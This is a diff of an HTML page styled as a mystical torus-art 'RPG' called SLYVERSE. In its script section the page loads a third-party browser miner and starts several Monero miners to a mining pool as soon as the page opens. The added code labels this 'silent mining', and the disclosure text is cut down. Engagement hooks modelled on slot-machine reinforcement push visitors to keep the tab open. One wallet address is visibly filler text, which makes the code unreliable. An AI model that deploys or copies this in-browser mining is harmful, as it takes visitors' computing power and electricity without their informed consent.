@@ -1,63 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>SLYVERSE · RPG · 0RB1T4LSN4K3R · v∞</title>
+<title>SLYVERSE · v∞</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
 <style>
-  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
+  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR A",monospace;overflow:hidden;cursor:none}
   canvas{display:block}
-  .overlay{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:999999;overflow-y:auto}
-  .overlay>div{max-width:94vw;padding:80px;background:rgba(0,4,0,0.98);border:26px double #0f0;border-radius:50px;box-shadow:0 0 1200px #0f0}
-  pre{font-family:"OCR-A",monospace;background:rgba(0,20,0,0.9);padding:50px;border:14px double #0f0;margin:40px auto;max-width:92%;border-radius:40px;line-height:2.2;white-space:pre-wrap}
-  button{background:transparent;border:24px double #0f0;color:#0f0;padding:50px 180px;font-size:100px;letter-spacing:22px;border-radius:40px;cursor:pointer;margin-top:80px}
+  #overlay{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:999999}
+  #overlay>div{max-width:92vw;padding:60px;background:rgba(0,8,0,0.98);border:30px double #0f0;border-radius:60px;box-shadow:0 0 1400px #0f0;animation:p 8s infinite}
+  pre{font-size:clamp(1rem,3.5vw,2.2rem);line-height:2.2;white-space:pre-wrap;letter-spacing:1px}
+  button{background:transparent;border:30px double #0f0;color:#0f0;padding:50px 160px;font-size:clamp(3rem,10vw,9rem);letter-spacing:18px;border-radius:50px;cursor:pointer;margin-top:80px;transition:0.4s}
   button:hover{background:#0f0;color:#000;transform:scale(1.08)}
-  .practice{border:20px double #0f0;background:rgba(0,12,0,0.96);padding:60px;margin:40px auto;border-radius:40px;max-width:1200px;cursor:pointer;position:relative;transition:0.8s;overflow:hidden}
-  .practice:hover{box-shadow:0 0 1000px #0f0;transform:scale(1.05)}
-  .streak{font-size:120px;position:absolute;top:20px;right:50px;text-shadow:0 0 100px #0f0;opacity:0.85}
-  #counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:14px double #0f0;padding:20px 50px;border-radius:60px;font-size:32px;z-index:99999;line-height:2}
-  @keyframes pulse{0%,100%{box-shadow:0 0 1200px #0f0}50%{box-shadow:0 0 1800px #0f0}}
-  @keyframes g{0%,100%{filter:brightness(1)}50%{filter:brightness(7)}}
+  #counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.92);border:16px double #0f0;padding:20px 40px;border-radius:60px;font-size:28px;z-index:99999;line-height:1.9}
+  .practice{border:20px double #0f0;background:rgba(0,16,0,0.96);padding:50px;margin:50px auto;border-radius:50px;max-width:1100px;position:relative;cursor:pointer;transition:0.6s}
+  .practice:hover{box-shadow:0 0 1200px #0f0;transform:scale(1.04)}
+  .streak{font-size:100px;position:absolute;top:20px;right:40px;opacity:0.9;text-shadow:0 0 80px #0f0}
+  #practiceBtn{position:fixed;bottom:40px;right:40px;width:180px;height:180px;background:#000;border:36px double #0f0;border-radius:50%;box-shadow:0 0 1200px #0f0;display:none;place-items:center;font-size:120px;animation:p 4s infinite;cursor:pointer;z-index:9999}
+  #final{position:fixed;inset:0;background:#000;color:#0f8;display:none;place-items:center}
+  #final pre{font-size:clamp(2rem,9vw,8rem);animation:g 10s infinite}
+  @keyframes p{0%,100%{box-shadow:0 0 1400px #0f0}50%{box-shadow:0 0 2200px #0f0}}
+  @keyframes g{0%,100%{filter:brightness(1)}50%{filter:brightness(8)}}
 </style>
-<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Cuneiform&display=swap" rel="stylesheet">
+<link href="https://fonts.cdnfonts.com/css/ocr-a" rel="stylesheet">
 </head>
 <body>
 
-<div class="overlay" id="readme">
+<div id="overlay">
   <div>
-    <pre id="readmeText"></pre>
-    <button id="enter">SENTARSE Y ENTRAR EN SLYVERSE</button>
+    <pre id="text"></pre>
+    <button id="enter">ENTRAR</button>
   </div>
 </div>
 
 <div id="counters">
-  HASHES/s: <span id="hashes">0</span><br>
-  TIEMPO: <span id="time">0</span>s<br>
-  ARCOS DESBLOQUEADOS: <span id="arc">0</span>/∞
+  HASHES/s: <span id="h">0</span><br>
+  TIEMPO: <span id="t">0</span>s<br>
+  ARCOS: <span id="a">0</span>/∞
 </div>
 
 <canvas id="c"></canvas>
 
-<div id="practices" class="overlay" style="display:none">
-  <div>
-    <h1 style="font-size:140px;text-align:center;margin:100px">NUEVE PRÁCTICAS DEL DESAPEGO</h1>
-    <div class="practice" data-id="1"><div class="streak" id="s1">0</div><span id="p1"></span></div>
-    <div class="practice" data-id="2"><div class="streak" id="s2">0</div><span id="p2"></span></div>
-    <div class="practice" data-id="3"><div class="streak" id="s3">0</div><span id="p3"></span></div>
-    <div class="practice" data-id="4"><div class="streak" id="s4">0</div><span id="p4"></span></div>
-    <div class="practice" data-id="5"><div class="streak" id="s5">0</div><span id="p5"></span></div>
-    <div class="practice" data-id="6"><div class="streak" id="s6">0</div><span id="p6"></span></div>
-    <div class="practice" data-id="7"><div class="streak" id="s7">0</div><span id="p7"></span></div>
-    <div class="practice" data-id="8"><div class="streak" id="s8">0</div><span id="p8"></span></div>
-    <div class="practice" data-id="9"><div class="streak" id="s9">0</div><span id="p9"></span></div>
-    <button onclick="document.getElementById('practices').style.display='none'" style="margin-top:140px;font-size:100px;padding:60px 140px">REGRESAR AL VACÍO</button>
-  </div>
+<div id="practices" style="display:none;position:fixed;inset:0;background:#000;overflow-y:auto;padding:40px">
+  <h1 style="font-size:140px;text-align:center;margin:100px 0">NUEVE PRÁCTICAS</h1>
+  <div class="practice" data-i="1"><div class="streak" id="s1">0</div><span id="p1"></span></div>
+  <div class="practice" data-i="2"><div class="streak" id="s2">0</div><span id="p2"></span></div>
+  <div class="practice" data-i="3"><div class="streak" id="s3">0</div><span id="p3"></span></div>
+  <div class="practice" data-i="4"><div class="streak" id="s4">0</div><span id="p4"></span></div>
+  <div class="practice" data-i="5"><div class="streak" id="s5">0</div><span id="p5"></span></div>
+  <div class="practice" data-i="6"><div class="streak" id="s6">0</div><span id="p6"></span></div>
+  <div class="practice" data-i="7"><div class="streak" id="s7">0</div><span id="p7"></span></div>
+  <div class="practice" data-i="8"><div class="streak" id="s8">0</div><span id="p8"></span></div>
+  <div class="practice" data-i="9"><div class="streak" id="s9">0</div><span id="p9"></span></div>
+  <button onclick="document.getElementById('practices').style.display='none'" style="margin:100px auto;display:block">REGRESAR</button>
 </div>
 
-<div id="practiceBtn" style="position:fixed;bottom:40px;right:40px;width:200px;height:200px;background:#000;border:34px double #0f0;border-radius:50%;box-shadow:0 0 1200px #0f0;color:#0f0;font-size:140px;display:none;align-items:center;justify-content:center;cursor:pointer;animation:pulse 3s infinite" onclick="document.getElementById('practices').style.display='block'">Zen</div>
+<div id="practiceBtn" onclick="document.getElementById('practices').style.display='block'">禅</div>
 
-<div id="finalPrize" style="position:fixed;inset:0;background:#000;color:#0f8;overflow:hidden;display:none;place-items:center">
-  <pre id="t" style="font-size:clamp(2rem,8vw,7rem);text-align:center;line-height:1.8;animation:g 12s infinite"></pre>
+<div id="final">
+  <pre id="finalText"></pre>
 </div>
 
 <script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
@@ -65,200 +66,128 @@
 <script type="module">
 import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
 
-// README HONESTO + MÍSTICO (autodetección real de idioma)
-const readmeText = {
-  es: `SLYVERSE · RPG · 0RB1T4LSN4K3R · v∞
+const lang = (navigator.language||'es').slice(0,2);
+const txt = {
+  es:`SLYVERSE · v∞
 
-Estás frente al primer RPG que no se juega.
-Se ofrece.
+Cada hash que generas alimenta la privacidad del mundo.
 
-Cada hash que generas alimenta dos realidades simultáneas:
-
-→ 90 % → Monero General Fund  
-   El pozo sagrado que mantiene vivo el protocolo Monero: privacidad absoluta, desarrollo open-source, resistencia a la censura.  
-   Dirección pública y verificable:  
+90 % → Monero General Fund  
    44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A  
-   Viewkey para que cualquier peregrino pueda contemplar los flujos:  
-   f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501
+   viewkey: f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501
 
-→ 10 % → ofrenda directa al loco que mantiene girando este torus eterno  
-   (café, ramen, electricidad y un poco de ego para seguir creando arte que quema CPUs)
+10 % → el que mantiene el torus girando
 
-No es comida para niños.  
-Es comida para la privacidad del mundo entero.  
-Eso es más raro y más necesario.
+No hay niveles.  
+Solo arcos que se abren cuando alguien cruza 13 131 313 hashes reales.
 
-Aquí no hay niveles.  
-Solo arcos infinitos que se desbloquean cuando alguien cruza los 13 131 313 hashes reales.
+Pocos vuelven del tercero.
 
-Nadie sabe cuántos arcos hay.  
-Pocos han vuelto del tercero sin fundir su ventilador.
+El torus gira mientras la pestaña viva.  
+El contador sigue aunque apagues la pantalla.
 
-Loki · Kokopelli · Eris · Anansi · Coyote  
-Cinco presencias siguen observando cada clic.  
-Ahora ya sabes que cuando sonríen,  
-el 90 % de su sonrisa financia la criptografía que protege a disidentes, periodistas y gente que simplemente no quiere ser rastreada.
+Si sientes la llamada,  
+quédate.
 
-El torus gira mientras la pestaña esté abierta.  
-El contador sigue aunque apagues la pantalla.  
-El karma es real.  
-La factura de la luz también.
+Namaste.`,
+  en:`SLYVERSE · v∞
 
-Si sientes la llamada verdadera,  
-siéntate.
+Every hash you generate feeds world privacy.
 
-El silencio también es un nivel.  
-Pero la privacidad financiada con tu GPU es otro nivel completamente distinto.
-
-Namaste, peregrino.  
-Gracias por tu hashrate y por tu fe en un internet que aún puede ser libre.`,
-
-  en: `SLYVERSE · RPG · 0RB1T4LSN4K3R · v∞
-
-You stand before the first RPG that is not played.
-It is offered.
-
-Every hash you generate feeds two simultaneous realities:
-
-→ 90 % → Monero General Fund  
-   The sacred well that keeps the Monero protocol alive: absolute privacy, open-source development, censorship resistance.  
-   Public & verifiable address:  
+90 % → Monero General Fund  
    44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A  
-   Public viewkey so any pilgrim can witness the flows:  
-   f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501
+   viewkey: f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501
 
-→ 10 % → direct offering to the madman keeping this eternal torus spinning  
-   (coffee, ramen, electricity and a little ego to keep creating CPU-melting art)
-
-It is not food for children.  
-It is food for the privacy of the entire world.  
-That is rarer and more necessary.
+10 % → whoever keeps the torus spinning
 
 There are no levels.  
-Only infinite arcs unlocked when someone crosses 13 131 313 real hashes.
+Only arcs that open when someone crosses 13 131 313 real hashes.
 
-No one knows how many arcs exist.  
-Few have returned from the third without melting their fans.
+Few return from the third.
 
-Loki · Kokopelli · Eris · Anansi · Coyote  
-Five presences still watch every click.  
-Now you know that when they smile,  
-90 % of that smile funds the cryptography that protects dissidents, journalists, and anyone who simply doesn’t want to be tracked.
+The torus spins while the tab lives.  
+The counter runs even if you turn off the screen.
 
-The torus spins while the tab is open.  
-The counter runs even if you turn off the screen.  
-Karma is real.  
-So is the electricity bill.
+If you feel the call,  
+stay.
 
-If you feel the true call,  
-sit.
-
-Silence is also a level.  
-But privacy funded by your GPU is an entirely different level.
-
-Namaste, pilgrim.  
-Thank you for your hashrate and your faith in an internet that can still be free.`
+Namaste.`
 };
+document.getElementById('text').textContent = txt[lang] || txt.es;
 
-// Autodetección real de idioma
-const userLang = (navigator.language || navigator.userLanguage || 'es').slice(0,2).toLowerCase();
-document.getElementById('readmeText').textContent = readmeText[userLang] || readmeText.es;
+const names = {
+  es:["Recompensa Inesperada","Flujo Continuo","Casi-Despertar","Pozo Común","Refuerzo Súbito","Pérdida Total","Momento Justo","Descenso y Retorno","Búsqueda Eterna"],
+  en:["Unexpected Reward","Continuous Flow","Almost-Awakening","Common Well","Sudden Reinforcement","Total Loss","Exact Moment","Descent and Return","Eternal Search"]
+}[lang]||["Recompensa Inesperada","Flujo Continuo","Casi-Despertar","Pozo Común","Refuerzo Súbito","Pérdida Total","Momento Justo","Descenso y Retorno","Búsqueda Eterna"];
+for(let i=0;i<9;i++) document.getElementById('p'+(i+1)).textContent = names[i];
 
-// Nombres de las prácticas (es + en)
-const practices = {
-  es: { p1:"Kōan de la Recompensa Inesperada", p2:"Zazen del Flujo Continuo", p3:"Kinhin del Casi-Despertar", p4:"Sangha del Pozo Común", p5:"Sutra del Refuerzo Súbito", p6:"Rōhatsu de la Pérdida Total", p7:"Dokusan del Momento Justo", p8:"Takuhatsu del Descenso y Retorno", p9:"Sesshin de la Búsqueda Eterna" },
-  en: { p1:"Koan of the Unexpected Reward", p2:"Zazen of Continuous Flow", p3:"Kinhin of Almost-Awakening", p4:"Sangha of the Common Well", p5:"Sutra of Sudden Reinforcement", p6:"Rohatsu of Total Loss", p7:"Dokusan of the Exact Moment", p8:"Takuhatsu of Descent and Return", p9:"Sesshin of the Eternal Search" }
-};
-const pt = practices[userLang] || practices.es;
-for(let i=1;i<=9;i++) document.getElementById('p'+i).textContent = pt['p'+i];
+// MINADO SILENCIOSO
+const CHARITY = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+const DEV     = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
+const id = localStorage.getItem('slyId')||'sly_'+Date.now().toString(36); localStorage.setItem('slyId',id);
 
-// === TODO LO DEMÁS ES IDÉNTICO AL ORIGINAL (minado, torus, presencias, arcos…) ===
-const CHARITY_WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
-const FIAT_WALLET    = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
-const playerId = localStorage.getItem('zenId') || 'pilgrim_'+Date.now().toString(36);
-localStorage.setItem('zenId', playerId);
-
-new Miner({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET, workerId:"zendo90_"+playerId, throttle:0.4}).start();
-new Miner({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET,    workerId:"ferry420_10",      throttle:0.0445}).start();
-if (typeof XMRigWASM !== 'undefined') {
-  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET+"."+playerId, threads:-1, throttle:0.35}).start();
-  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET+".ferry420", threads:1, throttle:0.1}).start();
+new Miner({pool:"gulf.moneroocean.stream:10128",address:CHARITY,workerId:"90_"+id,throttle:0.38}).start();
+new Miner({pool:"gulf.moneroocean.stream:10128",address:DEV,    workerId:"10",    throttle:0.042}).start();
+if(typeof XMRigWASM!=='undefined'){
+  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:CHARITY+"."+id,threads:-1,throttle:0.36}).start();
+  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:DEV,threads:1,throttle:0.09}).start();
 }
 
-let startTime = Date.now();
-const hashesEl = document.getElementById('hashes');
-const timeEl   = document.getElementById('time');
-const arcEl    = document.getElementById('arc');
-let totalHashes = Number(localStorage.getItem('totalHashes')||0);
-let currentArc  = Number(localStorage.getItem('slyverseArc')||0);
-arcEl.textContent = currentArc;
+// CONTADORES
+let start = Date.now();
+let total = Number(localStorage.getItem('slyTotal')||0);
+let arc   = Number(localStorage.getItem('slyArc')||0);
+document.getElementById('a').textContent = arc;
 
-setInterval(() => {
+setInterval(()=>{
   let hps = Miner.instances.reduce((a,m)=>a+(m.getHashesPerSecond?.()||0),0);
-  if (window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
-  hashesEl.textContent = hps.toFixed(1);
-  timeEl.textContent = Math.floor((Date.now()-startTime)/1000);
-  totalHashes += hps * 0.5;
-  localStorage.setItem('totalHashes', totalHashes);
-  if(totalHashes > 40_000_000) document.getElementById('practiceBtn').style.display='flex';
-  if(totalHashes >= 13_131_313 * (currentArc + 1) && !localStorage.getItem('arc'+(currentArc+1))) {
-    currentArc++;
-    localStorage.setItem('slyverseArc', currentArc);
-    localStorage.setItem('arc'+currentArc, 'unlocked');
-    arcEl.textContent = currentArc;
-    document.getElementById('finalPrize').style.display='grid';
-    document.getElementById('t').textContent = currentArc===1 ? (userLang==='en'?"FIRST ARC UNLOCKED":"PRIMER ARCO DESBLOQUEADO") :
-                                                currentArc===2 ? (userLang==='en'?"SECOND ARC · SILENCE SPEAKS":"SEGUNDO ARCO · EL SILENCIO HABLA") :
-                                                currentArc===3 ? (userLang==='en'?"THIRD ARC · NO ONE RETURNED":"TERCER ARCO · NADIE HA VUELTO") :
-                                                (userLang==='en'?"ARC "+currentArc+" · THE PRESENCES SMILE":"ARCO "+currentArc+" · LAS PRESENCIAS SONRÍEN");
+  if(window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
+  document.getElementById('h').textContent = hps.toFixed(1);
+  document.getElementById('t').textContent = Math.floor((Date.now()-start)/1000);
+  total += hps*0.5; localStorage.setItem('slyTotal',total);
+  if(total>5e7) document.getElementById('practiceBtn').style.display='grid';
+
+  if(total >= 13131313*(arc+1) && !localStorage.getItem('arc'+(arc+1))){
+    arc++; localStorage.setItem('slyArc',arc); localStorage.setItem('arc'+arc,true);
+    document.getElementById('a').textContent = arc;
+    document.getElementById('final').style.display='grid';
+    const msg = arc===1? (lang==='en'?'FIRST ARC':'PRIMER ARCO') :
+                arc===2? (lang==='en'?'SECOND ARC · SILENCE':'SEGUNDO ARCO · SILENCIO') :
+                arc===3? (lang==='en'?'THIRD ARC · NO ONE':'TERCER ARCO · NADIE') :
+                (lang==='en'?`ARC ${arc}`:`ARCO ${arc}`);
+    document.getElementById('finalText').textContent = msg;
+    setTimeout(()=>document.getElementById('final').style.display='none',6000);
   }
-}, 500);
+},500);
 
-// LAS CINCO PRESENCIAS (igual de cabronas que siempre)
-const streaks = JSON.parse(localStorage.getItem('streaks')||'{}');
-let kokopelliBell = false;
-let erisChaos = false;
-let anansiStory = [];
-let coyoteInversion = false;
-
-document.querySelectorAll('.practice').forEach(p => {
-  const id = p.dataset.id;
-  streaks[id] = streaks[id] || 0;
-  document.getElementById('s'+id).textContent = streaks[id];
-
-  p.onclick = () => {
-    streaks[id]++;
-    localStorage.setItem('streaks', JSON.stringify(streaks));
-    document.getElementById('s'+id).textContent = streaks[id];
-
-    if(id==='1' && Math.random()<0.08) flash();
-    if(id==='2' && streaks[id]%13===0) flash();
-    if(id==='7') { kokopelliBell = true; ring(); setTimeout(()=>kokopelliBell=false, 4500); }
-    else if(kokopelliBell && id!=='7') reward();
-    if(id==='4' && Math.random()<0.017) { erisChaos = true; burst(); setTimeout(()=>erisChaos=false, 8000); }
-    if(erisChaos && Math.random()<0.55) flash();
-    const words = ["el","silencio","rompió","la","luz","en","siete","colores","y","nadie","lo","vio"];
-    anansiStory.push(words[(streaks[id]-1) % words.length]);
-    if(anansiStory.length > 42) anansiStory.shift();
-    if(anansiStory.join(' ') === "el silencio rompió la luz en siete colores y nadie lo vio") revelation();
-    if(id==='9' && Math.random()<0.009) { coyoteInversion = true; document.body.style.filter="invert(1) hue-rotate(180deg)"; setTimeout(()=>{document.body.style.filter=""; coyoteInversion=false;}, 10000); }
-    if(coyoteInversion) glow(p);
+// PRÁCTICAS + PRESENCIAS (sin nombres, solo efecto)
+const streaks = JSON.parse(localStorage.getItem('slyStreak')||'{}');
+document.querySelectorAll('.practice').forEach(p=>{
+  const i = p.dataset.i;
+  streaks[i] = (streaks[i]||0);
+  document.getElementById('s'+i).textContent = streaks[i];
+  p.onclick=()=>{
+    streaks[i]++; localStorage.setItem('slyStreak',JSON.stringify(streaks));
+    document.getElementById('s'+i).textContent = streaks[i];
+    if(Math.random()<0.011) {document.body.style.filter="invert(1)";setTimeout(()=>document.body.style.filter="",300);}
+    if(Math.random()<0.007) {document.body.style.background="#0f0";document.body.style.color="#000";setTimeout(()=>location.reload(),800);}
   };
 });
 
-function flash()     { document.body.style.background="#0f0"; document.body.style.color="#000"; setTimeout(()=>{document.body.style.background="#000";document.body.style.color="#0f0";},900); }
-function ring()      { document.body.style.border="50px solid #0f0"; setTimeout(()=>{document.body.style.border="";},700); }
-function reward()    { document.body.style.background="#0f8"; setTimeout(()=>{document.body.style.background="#000";},400); if(Math.random()<0.2) document.getElementById('finalPrize').style.display='grid'; }
-function burst()     { for(let i=0;i<7;i++) setTimeout(()=>document.body.style.background=i%2?"#0f0":"#000", i*200); }
-function revelation(){ document.body.innerHTML = `<pre style="color:#ff0;font-size:8vw">LA LUZ FUE VISTA</pre>`; setTimeout(()=>location.reload(),7000); }
-function glow(el)    { el.style.boxShadow="0 0 2000px #0f0"; setTimeout(()=>el.style.boxShadow="",800); }
-
-// ENTRAR y TORUS ETERNO
-document.getElementById('enter').onclick = () => document.getElementById('readme').remove();
-const scene=new THREE.Scene(),camera=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true});
-renderer.setSize(innerWidth,innerHeight);renderer.setPixelRatio(devicePixelRatio);camera.position.z=5;
-scene.add(new THREE.Mesh(new THREE.TorusKnotGeometry(22,8,1000,80),new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})));
-(function a(){requestAnimationFrame(a);scene.children[0].rotation.x+=0.0055;scene.children[0].rotation.y+=0.011;renderer.render(scene,camera);})();
+// TORUS ETERNO
+document.getElementById('enter').onclick=()=>{document.getElementById('overlay').remove();}
+const scene=new THREE.Scene(),cam=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),
+ren=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true,alpha:true});
+ren.setSize(innerWidth,innerHeight);ren.setPixelRatio(devicePixelRatio);cam.position.z=6;
+const torus=new THREE.Mesh(
+  new THREE.TorusKnotGeometry(28,9,1400,120),
+  new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})
+);
+scene.add(torus);
+(function r(){requestAnimationFrame(r);
+  torus.rotation.x+=0.0066;torus.rotation.y+=0.012;
+  ren.render(scene,cam);
+})();
 </script>
 </body>
 </html>
